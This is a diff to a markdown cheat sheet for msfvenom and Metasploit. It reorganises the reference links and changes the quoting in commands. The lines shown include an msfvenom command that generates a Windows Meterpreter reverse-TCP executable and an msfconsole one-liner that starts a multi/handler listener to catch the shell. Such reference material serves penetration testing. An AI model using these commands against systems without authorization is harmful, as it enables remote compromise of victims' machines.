@@ -1,11 +1,5 @@
-[MSFVenom - CheatSheet
- by hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
-
-[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter by infinitelogins)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
-
 - [Syntax](#syntax)
 - [32 bit](#32-bit)
-
 
 # [Syntax](#syntax-1)
 (not case sensitive, variable can be used for LHOST)
@@ -18,13 +12,13 @@ msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<port> -f <FORMAT> -e <ENCODER> -i <ENCOD
 ```sh
 myip=127.0.0.1
 port=3232
-msfvenom -p windows/meterpreter/reverse_tcp lhost="$myip" lport="$port" -f exe -o rev.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=$port -f exe -o rev3232.exe
 ```
 
 ### Capture 32 vs 64 bit (exploit/multi/handler) in One Liner
 https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
 ```sh
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST "$myip";set LPORT "$port";run;"
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $myip;set LPORT $port;run;"
 ```
 
 ### Capture 32 vs 64 bit (exploit/multi/handler)
@@ -209,3 +203,10 @@ Framework Transform Formats [--format <value>]
 ```sh
 
 ```
+
+# References
+
+[MSFVenom - CheatSheet
+ by hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
+
+[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter by infinitelogins)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
